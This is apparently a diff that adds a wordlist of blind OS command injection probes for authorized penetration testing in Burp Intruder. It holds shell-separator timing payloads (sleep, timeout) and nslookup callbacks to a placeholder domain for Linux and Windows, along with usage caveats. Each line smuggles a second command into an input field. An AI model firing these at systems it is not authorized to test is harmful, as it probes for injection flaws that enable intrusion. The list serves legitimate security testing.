@@ -1,0 +1,37 @@
+# Blind OS command injection payloads for authorized testing
+# Use one line at a time in Burp Intruder.
+# Replace CALLBACK-ID.example.test with a unique domain you control.
+# Timing payloads use localhost only and do not read, write, or alter data.
+
+# Linux / Unix: shell separators and timing probes
+;sleep 5
+;sleep${IFS}5
+|sleep 5
+||sleep 5
+&&sleep 5
+%0asleep%205
+
+# Windows: command separators and timing probes
+& timeout /t 5 /nobreak
+| timeout /t 5 /nobreak
+|| timeout /t 5 /nobreak
+&& timeout /t 5 /nobreak
+%0Atimeout%20/t%205%20/nobreak
+
+# Linux / Unix: DNS out-of-band probes
+;nslookup CALLBACK-ID.example.test
+|nslookup CALLBACK-ID.example.test
+||nslookup CALLBACK-ID.example.test
+&&nslookup CALLBACK-ID.example.test
+
+# Windows: DNS out-of-band probes
+&nslookup CALLBACK-ID.example.test
+|nslookup CALLBACK-ID.example.test
+||nslookup CALLBACK-ID.example.test
+&&nslookup CALLBACK-ID.example.test
+
+# Notes:
+# - Test only applications and callback infrastructure you own or are authorized to assess.
+# - Establish a baseline before timing tests and account for retries, latency, and timeouts.
+# - A callback or delay is an indicator; verify it with controls before reporting.
+# - Do not add payloads that read files, exfiltrate data, modify the system, or bypass filters.
